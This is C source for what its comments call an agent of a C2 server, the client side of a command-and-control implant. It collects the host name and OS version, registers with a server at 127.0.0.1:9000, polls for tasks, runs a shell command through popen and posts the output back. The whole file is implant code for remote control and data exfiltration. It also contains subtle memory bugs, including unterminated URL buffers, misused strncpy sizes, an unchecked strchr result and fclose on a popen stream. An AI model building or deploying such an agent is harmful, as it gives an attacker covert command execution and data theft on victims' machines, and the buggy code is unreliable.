#include <errno.h>
#include <limits.h>
#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <stddef.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/utsname.h>
#include "initiate.h"
#include "curl_utils.h"
#include "host_utils.h"

#define UUIDLEN 36

// ref https://curl.se/libcurl/c/postit2.html

static size_t mem_cb(void *contents, size_t size, size_t nmemb, void *userp);

bool get_host_info(struct agent_info *agent)
{
	// Get target hostname.
	if (gethostname(agent->hostname, sizeof(agent->hostname)) == -1)
	{
		perror("Error acquiring host name.\n");
		return false;
	}

	// Get target OS and version.
	struct utsname buf;
	errno = 0;
	if (uname(&buf) != 0)
	{
		perror("uname error\n");
		return false;
	}

	strncpy(agent->os_type, buf.nodename, sizeof(buf.nodename) + 1);
	strncpy(agent->os_version, buf.version, sizeof(buf.version) + 1);

	return true;
}

bool reg(struct agent_info *agent, struct strings_array *sa)
{

	// struct strings_array chunk = {.response = NULL, .size = 0};
	struct web_comms web = {NULL, 0, NULL};

	if (!curl_prep(&web))
	{
		perror("curl_prep failed\n");
		exit(1);
	}

	add_curl_field(web.form, "hostname", agent->hostname);
	add_curl_field(web.form, "os type", agent->os_type);
	add_curl_field(web.form, "os version", agent->os_version);
	add_curl_field(web.form, "submit", "send");

	// Registration URL
	const char regurl[19] = "127.0.0.1:9000/reg";
	curl_easy_setopt(web.curl, CURLOPT_URL, regurl);

	// Set options for POST
	curl_easy_setopt(web.curl, CURLOPT_MIMEPOST, web.form);

	// Send data to mem_cb function as opposed to writing to stdout.
	curl_easy_setopt(web.curl, CURLOPT_WRITEFUNCTION, mem_cb);

	// Pass chunk to callback function.
	curl_easy_setopt(web.curl, CURLOPT_WRITEDATA, (void *)sa);

	// Perform the request, res will get the return code
	web.res = curl_easy_perform(web.curl);

	char *ret;

	// Strchr for @, as the c2 server precedes the UUID with the @ character.
	ret = strchr(sa->response, '@');

	// Move pointer to the right one (ret +1) to copy UUID after the @ char.
	strncpy(agent->uuid, ret + 1, UUIDLEN);

	// Check for errors
	if (web.res != CURLE_OK)
	{
		fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(web.res));
		return false;
	}

	// Always cleanup.
	curl_easy_cleanup(web.curl);

	// Then cleanup the form.
	curl_mime_free(web.form);

	return true;
}

// Takes write_function output and stores it in memory.
// Ref: https://everything.curl.dev/libcurl/callbacks/write
static size_t mem_cb(void *contents, size_t size, size_t nmemb, void *userp)
{
	size_t realsize = size * nmemb;
	struct strings_array *mem = (struct strings_array *)userp;

	char *ptr = realloc(mem->response, mem->size + realsize + 1);
	if (!ptr)
	{
		/* out of memory! */
		printf("not enough memory (realloc returned NULL)\n");
		return 0;
	}

	mem->response = ptr;
	memcpy(&(mem->response[mem->size]), contents, realsize);
	mem->size += realsize;
	mem->response[mem->size] = 0;

	//   printf("The data in the function is %s\n\n", mem->memory);

	return realsize;
}

bool check_tasks(struct agent_info *agent, struct strings_array *sa)
{
    struct web_comms web = {NULL, 0, NULL};

    if (!curl_prep(&web))
    {
        perror("curl_prep failed\n");
        exit(1);
    }

	char tasks_url[64] = "127.0.0.1:9000/tasks/";
	strncat(tasks_url, agent->uuid, strlen(agent->uuid));
	printf("Tasks URL is: %s", tasks_url);



	curl_easy_setopt(web.curl, CURLOPT_URL, tasks_url);

	// This line below specifies what to do with the data when we receive it,
	// as opposed to printing it to stdout. We will pass in a ptr to our own function
	// called got_data in this example. This is known as a call back function.
	// Send data to this function as opposed to writing to stdout.
	curl_easy_setopt(web.curl, CURLOPT_WRITEFUNCTION, mem_cb);

	// Pass chunk to callback function.
	curl_easy_setopt(web.curl, CURLOPT_WRITEDATA, (void *)sa);

	// set options
	// perform our action
	// curl_easy_perform accepts the options set above and in this case will
	// download the content from the URL.
	// CURLcode resul saves the return code from curl_easy_perform.
	CURLcode result = curl_easy_perform(web.curl);

	printf("The data returning from check tasks is %s\n\n", sa->response);

	if (result != CURLE_OK)
	{
		fprintf(stderr, "download problem: %s\n",
				curl_easy_strerror(result));
	}

	curl_easy_cleanup(web.curl);
	return 0;
}

// Executes a given task.
// ref: https://www.linuxquestions.org/questions/linux-newbie-8/
// help-in-getting-return-status-of-popen-sys-call-870219/
bool run_cmd(struct strings_array *sa)
{
	// Allocates space for array to a size of cap (1) * size of char, as size
	// of file is unknown. When memory runs out realloc() will allocate
	// additional memory later in word_extract(). */

	FILE *cmd_fptr = NULL;
	char line[1024] = {'\0'};
	int cmd_ret = 0;
	size_t cur_len = 0;

	if ((cmd_fptr = popen("ip addr", "r")) != NULL)
	{
		while (fgets(line, sizeof(line), cmd_fptr) != NULL)
		{
			size_t buf_len = strlen(line);
			char *tmp_space = realloc(sa->results, buf_len + cur_len + 1);
			if (!tmp_space)
			{
				perror("Unable to resize.\n");
				fclose(cmd_fptr);
				free(sa->results);
				return false;
			}
			sa->results = tmp_space;
			strncpy(sa->results + cur_len, line, buf_len);
			cur_len += buf_len;
		}
	}
	cmd_ret = pclose(cmd_fptr);
	printf("The exit status is: %d\n", WEXITSTATUS(cmd_ret));
	if (cmd_ret != 0)
	{
		return false;
	}

	return true;
}

bool post_results(struct strings_array *sa)
{
	struct strings_array chunk = {.response = malloc(0), .size = 0};
	struct web_comms web = {NULL, 0, NULL};

	if (!curl_prep(&web))
	{
		perror("curl_prep failed\n");
		exit(1);
	}

	add_curl_field(web.form, "task id", "1234");

	add_curl_field(web.form, "task results", sa->results);

	// Add submit options to curl field data.
	add_curl_field(web.form, "submit", "send");

	// Registration URL
	const char resurl[27] = "127.0.0.1:9000/results/uuid";

	curl_easy_setopt(web.curl, CURLOPT_URL, resurl);

	curl_easy_setopt(web.curl, CURLOPT_MIMEPOST, web.form);

	// Send data to this function as opposed to writing to stdout.
	curl_easy_setopt(web.curl, CURLOPT_WRITEFUNCTION, mem_cb);

	// Pass chunk to callback function.
	curl_easy_setopt(web.curl, CURLOPT_WRITEDATA, (void *)&chunk);

	// Perform the request, res will get the return code
	web.res = curl_easy_perform(web.curl);

	printf("The data returning from post results is %s\n\n", chunk.response);

	// Check for errors
	if (web.res != CURLE_OK)
	{
		fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(web.res));
		return false;
	}

	// Always cleanup.
	curl_easy_cleanup(web.curl);

	free(chunk.response);

	// Then cleanup the form.
	curl_mime_free(web.form);

	return true;
}
